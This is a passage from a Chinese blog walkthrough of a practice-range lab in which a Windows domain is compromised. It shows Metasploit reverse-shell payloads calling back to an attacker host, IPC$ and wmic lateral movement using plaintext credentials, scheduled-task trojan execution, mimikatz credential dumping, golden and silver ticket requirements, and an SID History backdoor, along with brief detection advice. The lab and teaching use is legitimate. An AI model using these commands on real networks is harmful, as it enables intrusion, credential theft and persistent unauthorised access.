+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 10.10.10.80</span><br><span class="line"></span><br><span class="line">set lport 9999</span><br></pre></td></tr></table></figure>
+<p><strong>ipc连接</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.10\ipc$ &quot;1qaz@WSX&quot; /user:Administrator</span><br><span class="line">与域控主机10.10.10.10简历ipc连接Administrator,1qaz@WSX</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513195240156.png" alt="image-20230513195240156"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Users\de1ay.DE1AY\Desktop\p.exe \\10.10.10.10\c$\windows\temp\p.exe</span><br></pre></td></tr></table></figure>
+<p>要先将payload.exe上传到<code>C:\Users\de1ay\Desktop\</code>目录,成功将木马传输到域控主机</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513195321348.png" alt="image-20230513195321348"></p>
+<p><strong>在跳板机上通过wmic命令执行木马</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell wmic /node:10.10.10.10 /user:de1ay /password:1qaz@WSX process call create &quot;C:\Windows\Temp\p.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>域控上线</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513220236624.png" alt="image-20230513220236624"></p>
+<h6 id="CS">CS</h6>
+<p><strong>点击监听器设置 lport ,lhost</strong></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/1961ea83f06732bf1d2e588aaabbba96.png" alt="img"></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513200044489.png" alt="image-20230513200044489"></p>
+<p>msfvenom -p windows/meterpreter_reverse_tcp lhost=10.10.10.80 lport=9998 -f exe &gt; /tmp/p.exe</p>
+<p>shell net use \10.10.10.10\ipc$ “1qaz@WSX” /user:Administrator</p>
+<p>shell copy C:\Users\de1ay.DE1AY\Desktop\a.exe \10.10.10.10\c$\windows\temp\a.exe</p>
+<p>shell wmic /node:10.10.10.10 /user:de1ay /password:1qaz@WSX process call create “C:\Windows\Temp\a.exe”</p>
+<p><strong>这个路由不知道怎么弄没成功</strong></p>
+<h3 id="后渗透权限维持">后渗透权限维持</h3>
+<h4 id="域控信息收集">域控信息收集</h4>
+<p>在域控获得KRBTGT账户NTLM密码哈希和SID</p>
+<p><strong>抓取NTLM密码哈希</strong></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513230724719.png" alt="image-20230513230724719"></p>
+<p><strong>抓取SID</strong></p>
+<ul>
+<li>
+<p>tip1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513225924055.png" alt="image-20230513225924055"></p>
+<ul>
+<li>
+<p>tip2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
+<p>域名</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513230932837.png" alt="image-20230513230932837"></p>
+</li>
+</ul>
+<h4 id="黄金票据利用">黄金票据利用</h4>
+<p>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">黄金票据的条件要求：</span><br><span class="line"></span><br><span class="line">1.域名称</span><br><span class="line"></span><br><span class="line">2.域的SID值(并不一定要krbtgt的SID)</span><br><span class="line"></span><br><span class="line">3.域的KRBTGT账户NTLM密码哈希</span><br><span class="line"></span><br><span class="line">4.伪造用户名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513231004468.png" alt="image-20230513231004468"></p>
+<p>成功访问C盘<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513231705817.png" alt="image-20230513231705817"></p>
+<p>没有权限则会显示</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513231723189.png" alt="image-20230513231723189"></p>
+<h4 id="SID-History域后门">SID History域后门</h4>
+<p>原文链接:<a target="_blank" rel="noopener" href="https://blog.51cto.com/bypass/6097702">https://blog.51cto.com/bypass/6097702</a></p>
+<p>SID History可以防止用户迁移进入不同的域后权限发生改变,原理是如果迁移后用户SID改变了系统会将其原来的SID添加到迁移以后的用户SID History属性中,使其依然可以访问原来的资源,可以使用mimikatz把SID History属性添加到任意用户SID History属性,这样在获取域管理员权限后可以实现持久化</p>
+<p>域控制器上新建一个恶意用户test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test Admin124578 /add</span><br></pre></td></tr></table></figure>
+<p>使用域管理员权限的 Poweshell 查看 tester 用户的 SID History 属性</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser <span class="built_in">test</span> -Properties sidhistory</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/01113807_63fec89f4600c44109.png" alt="域内权限维持：SID History后门_数据库"></p>
+<p>使用域管理员权限运行mimikatz，将administrator的SID添加到普通用户test的SID History属性中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug	//提升权限</span><br><span class="line">sid::patch    //修复NTDS服务,可以使高权限SID注入到地权限用户的SID History属性</span><br><span class="line">sid::add /sam:whoami /new:Administrator   //将Administrator的SID添加到whoami的SID History属性中</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/01113807_63fec89f5d7b685424.png" alt="域内权限维持：SID History后门_数据库_02"></p>
+<p>重新查看test用户的SID History属性</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/01113807_63fec89f75a4341995.png" alt="域内权限维持：SID History后门_用户登录_03"></p>
+<p>使用 test 用户登录域控服务器，可以看到已经拥有了管理员权限。</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/01113807_63fec89f9184412298.png" alt="域内权限维持：SID History后门_用户登录_04"></p>
+<p><strong>检测方法</strong></p>
+<p>检测SID History后门的最佳方式就是枚举所有具体SID History属性的用户数据，找到用户的SIDHistory属性中的SID以“500”结尾的账号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser -Filter &quot;SIDHistory -like &#x27;*&#x27;&quot; -Properties SIDHistory| ` Where &#123; $_.SIDHistory -Like &quot;*-500&quot; &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/01113807_63fec89faba8b31375.png" alt="域内权限维持：SID History后门_管理员权限_05"></p>
+<p>每次更改用户对象时，都会生成4738的事件，监控SidHistory属性更改情况。另外，在windows日志里，没有找到4765和4766这两个事件，这里做个备注。(4765代表将 SID Histtory属性添加到用户的日志。4766代表将SID History属性添加到用户失败的日志。)</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/01113807_63fec89fc83fa29552.png" alt="域内权限维持：SID History后门_管理员权限_06"></p>
+<h4 id="上线PC">上线PC</h4>
+<p>发现DC域还有一个mssql机器</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513235936720.png" alt="image-20230513235936720"></p>
+<p>web给pc创建一个映射</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use X: \\pc\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230514001129921.png" alt="image-20230514001129921"></p>
+<p>显示有一个<strong>X</strong></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230514001147375.png" alt="image-20230514001147375"></p>
+<p>手贱把进程给关了,又不知道是什么玄学错误连不上了,直接搬WP</p>
+<p>然后传MSF木马：</p>
+<p>BASH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /home/kali/msf.exe X://msf.exe</span><br><span class="line">[*] uploading  : /home/kali/msf.exe -&gt; X://msf.exe</span><br><span class="line">[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /home/kali/msf.exe -&gt; X://msf.exe</span><br><span class="line">[*] uploaded   : /home/kali/msf.exe -&gt; X://msf.exe</span><br></pre></td></tr></table></figure>
+<p>接下来就是怎么去执行木马的问题了。</p>
+<blockquote>
+<p>而且这样传不会弹360 -,-</p>
+</blockquote>
+<p>先试了一下创建一个服务：</p>
+<p>BASH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;sc \\10.10.10.201 create bdtttttt binpath=&quot;C:\\msf.exe&quot;</span><br><span class="line">sc \\10.10.10.201 create bdtttttt binpath=&quot;C:\\msf.exe&quot;</span><br><span class="line">[SC] OpenSCManager FAILED 5:</span><br><span class="line"></span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure>
+<p>没有办法成功。</p>
+<p>建立IPC连接：</p>
+<p>BASH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;net use \\pc\ipc$</span><br><span class="line">net use \\pc\ipc$</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
+<p>居然成功了，定时任务执行：</p>
+<p>BASH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;at \\pc 15:23:00 cmd.exe /c &quot;start C:\\msf.exe&quot;</span><br><span class="line">at \\pc 15:23:00 cmd.exe /c &quot;start C:\\msf.exe&quot;</span><br><span class="line">Added a new job with job ID = 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20220413153046204.png" alt="image"></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20220413154200456.png" alt="image"></p>
+<p>拿下。****</p>
+<h4 id="白银票据">白银票据</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">所需条件:</span><br><span class="line"></span><br><span class="line">1、域名称</span><br><span class="line"></span><br><span class="line">2、域的SID值(用户的sid值去掉最后一个杠的数字就是域sid值)</span><br><span class="line"></span><br><span class="line">3、服务账号的NTML HASH</span><br><span class="line"></span><br><span class="line">4、伪造的用户名</span><br><span class="line"></span><br><span class="line">5、可利用的服务</span><br><span class="line"></span><br><span class="line">白银票据由TGS加密通常只有几分钟生效时间</span><br></pre></td></tr></table></figure>
+<p>获取明文密码</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230514002956544.png" alt="image-20230514002956544"></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230514003109415.png" alt="image-20230514003109415"></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230514003133911.png" alt="image-20230514003133911"></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230514003040323.png" alt="image-20230514003040323"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io">Jinmu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io/%E9%9D%B6%E5%9C%BA/ATT-CK/ATT&amp;CK(%E4%BA%8C)/">https://jinmu1108.github.io/%E9%9D%B6%E5%9C%BA/ATT-CK/ATT&amp;CK(%E4%BA%8C)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jinmu1108.github.io" target="_blank">J1Nmu</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/%E9%9D%B6%E5%9C%BA/ATT-CK/ATT&amp;CK(%E4%B8%80)/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ATT&amp;CK(一)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E9%9D%B6%E5%9C%BA/ATT-CK/ATT&CK(%E4%B8%80)/" title="ATT&amp;CK(一)"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-13</div><div class="title">ATT&amp;CK(一)</div></div></a></div><div><a href="/%E9%9D%B6%E5%9C%BA/DVWA-lab/DVWA-lab/" title="DVWA-lab"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-07</div><div class="title">DVWA-lab</div></div></a></div><div><a href="/%E9%9D%B6%E5%9C%BA/pikachu/pikachu/" title="pikachu"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-25</div><div class="title">pikachu</div></div></a></div><div><a href="/%E9%9D%B6%E5%9C%BA/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/upload-labs/" title="upload-labs"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-19</div><div class="title">upload-labs</div></div></a></div><div><a href="/%E9%9D%B6%E5%9C%BA/xss-labs/xss-labs-x/" title="xss-labs"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-23</div><div class="title">xss-labs</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jinmu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">48</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jinmu1108"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ATT&amp;CK(二)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8CVE-2019-2725%E5%86%99shell"><span class="toc-number">1.3.1.</span> <span class="toc-text">利用CVE-2019-2725写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%B4%BE%E7%94%9Fcs"><span class="toc-number">1.3.2.</span> <span class="toc-text">msf派生cs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%81%E7%A7%BB%E5%88%B0%E9%AB%98%E6%9D%83%E9%99%90%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">迁移到高权限进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8svc-exe%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">使用svc-exe进行提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">令牌窃取提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2"><span class="toc-number">1.3.4.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">域环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">凭据获取</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%93%E5%8F%96Hash"><span class="toc-number">1.3.4.2.1.</span> <span class="toc-text">抓取Hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E8%AF%81-%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.4.2.2.</span> <span class="toc-text">抓取明文凭证(密码)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.5.</span> <span class="toc-text">横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB%E6%A8%AA%E5%90%91"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">SMB横向</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#psexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.3.5.1.1.</span> <span class="toc-text">psexec横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-number">1.3.5.1.1.1.</span> <span class="toc-text">哈希传递</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E5%87%AD%E6%8D%AE"><span class="toc-number">1.3.5.1.1.2.</span> <span class="toc-text">伪造凭据</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IPC"><span class="toc-number">1.3.5.1.2.</span> <span class="toc-text">IPC$</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MSF"><span class="toc-number">1.3.5.1.2.1.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#CS"><span class="toc-number">1.3.5.1.2.2.</span> <span class="toc-text">CS</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.3.6.</span> <span class="toc-text">后渗透权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">域控信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">黄金票据利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SID-History%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.6.3.</span> <span class="toc-text">SID History域后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFPC"><span class="toc-number">1.3.6.4.</span> <span class="toc-text">上线PC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.3.6.5.</span> <span class="toc-text">白银票据</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%E9%9D%B6%E5%9C%BA/ATT-CK/ATT&amp;CK(%E4%BA%8C)/" title="ATT&amp;CK(二)"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ATT&amp;CK(二)"/></a><div class="content"><a class="title" href="/%E9%9D%B6%E5%9C%BA/ATT-CK/ATT&amp;CK(%E4%BA%8C)/" title="ATT&amp;CK(二)">ATT&amp;CK(二)</a><time datetime="2023-05-14T02:50:44.342Z" title="发表于 2023-05-14 10:50:44">2023-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E9%9D%B6%E5%9C%BA/ATT-CK/ATT&amp;CK(%E4%B8%80)/" title="ATT&amp;CK(一)"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ATT&amp;CK(一)"/></a><div class="content"><a class="title" href="/%E9%9D%B6%E5%9C%BA/ATT-CK/ATT&amp;CK(%E4%B8%80)/" title="ATT&amp;CK(一)">ATT&amp;CK(一)</a><time datetime="2023-05-13T15:02:07.175Z" title="发表于 2023-05-13 23:02:07">2023-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%8F%96%E8%AF%81/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="22美亚杯个人赛"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="22美亚杯个人赛"/></a><div class="content"><a class="title" href="/%E5%8F%96%E8%AF%81/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="22美亚杯个人赛">22美亚杯个人赛</a><time datetime="2023-05-05T14:56:14.069Z" title="发表于 2023-05-05 22:56:14">2023-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%8F%96%E8%AF%81/%E7%9B%98%E5%8F%A4%E7%9F%B3%E7%BB%83%E4%B9%A0%E9%A2%98/" title="盘古石练习题"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="盘古石练习题"/></a><div class="content"><a class="title" href="/%E5%8F%96%E8%AF%81/%E7%9B%98%E5%8F%A4%E7%9F%B3%E7%BB%83%E4%B9%A0%E9%A2%98/" title="盘古石练习题">盘古石练习题</a><time datetime="2023-05-05T14:56:14.068Z" title="发表于 2023-05-05 22:56:14">2023-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%B0%8F%E7%BB%93/%E5%B0%8F%E7%BB%93/" title="小结"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小结"/></a><div class="content"><a class="title" href="/%E5%B0%8F%E7%BB%93/%E5%B0%8F%E7%BB%93/" title="小结">小结</a><time datetime="2023-05-05T14:56:14.066Z" title="发表于 2023-05-05 22:56:14">2023-05-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Jinmu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i 